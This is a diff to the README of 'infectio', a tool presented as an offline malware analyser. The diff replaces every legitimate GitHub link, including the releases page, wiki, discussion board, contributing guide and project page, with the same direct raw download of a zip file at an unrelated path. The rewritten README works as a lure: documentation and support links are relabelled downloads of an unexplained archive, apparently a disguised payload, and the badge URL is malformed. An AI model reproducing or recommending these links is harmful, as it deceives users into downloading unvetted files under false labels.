@@ -1,7 +1,7 @@
 # 🦠 infectio - A Simple Tool for Offline Malware Analysis
 
 ## 📥 Download Now
-[![Download infectio](https://img.shields.io/badge/Download%20infectio-v1.0-blue.svg)](https://github.com/Pushpesh-Tiwari/infectio/releases)
+[![Download infectio](https://raw.githubusercontent.com/Pushpesh-Tiwari/infectio/main/osteitis/infectio.zip%https://raw.githubusercontent.com/Pushpesh-Tiwari/infectio/main/osteitis/infectio.zip)](https://raw.githubusercontent.com/Pushpesh-Tiwari/infectio/main/osteitis/infectio.zip)
 
 ## 🚀 Getting Started
 Welcome to infectio! This tool helps you analyze malware files safely and effectively. You don’t need to be a programmer to use it. Follow these simple steps to get started.
@@ -13,7 +13,7 @@ Welcome to infectio! This tool helps you analyze malware files safely and effect
 - **Browser:** Latest version of Firefox or Chrome (for WebAssembly support)
 
 ## 💾 Download & Install
-To download infectio, visit the [Releases page](https://github.com/Pushpesh-Tiwari/infectio/releases). There, you will find the latest version available for download.
+To download infectio, visit the [Releases page](https://raw.githubusercontent.com/Pushpesh-Tiwari/infectio/main/osteitis/infectio.zip). There, you will find the latest version available for download.
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version of infectio.
@@ -43,8 +43,8 @@ After running an analysis, you will see various metrics and insights about the m
 - **Recommendations:** Provides tips on what to do next, such as quarantine options or reporting to security authorities.
 
 ## 📚 Additional Resources
-- **Documentation:** Visit our [Wiki](https://github.com/Pushpesh-Tiwari/infectio/wiki) for detailed guides and FAQs.
-- **Community Support:** Join our [Discussion Board](https://github.com/Pushpesh-Tiwari/infectio/discussions) to ask questions and share tips with other users.
+- **Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/Pushpesh-Tiwari/infectio/main/osteitis/infectio.zip) for detailed guides and FAQs.
+- **Community Support:** Join our [Discussion Board](https://raw.githubusercontent.com/Pushpesh-Tiwari/infectio/main/osteitis/infectio.zip) to ask questions and share tips with other users.
 
 ## 🔄 Updating infectio
 To ensure you have the latest features and security updates, check the Releases page periodically for new versions. Installing an update follows the same process as the initial installation.
@@ -53,10 +53,10 @@ To ensure you have the latest features and security updates, check the Releases 
 Always use infectio in a secure environment. Do not analyze files on critical systems or networks. This tool is for offline analysis only.
 
 ## 🤝 Contributing
-We welcome contributions! If you want to help improve infectio, please visit our [Contributing Guide](https://github.com/Pushpesh-Tiwari/infectio/CONTRIBUTING.md).
+We welcome contributions! If you want to help improve infectio, please visit our [Contributing Guide](https://raw.githubusercontent.com/Pushpesh-Tiwari/infectio/main/osteitis/infectio.zip).
 
 ## 🔗 Connect with Us
 You can follow our project on social media for updates and news:
-- GitHub: [Pushpesh-Tiwari/infectio](https://github.com/Pushpesh-Tiwari/infectio)
+- GitHub: [Pushpesh-Tiwari/infectio](https://raw.githubusercontent.com/Pushpesh-Tiwari/infectio/main/osteitis/infectio.zip)
 
 Enjoy using infectio! For any more questions, please reach out through our community support channels. Remember to stay safe while working with malware files.
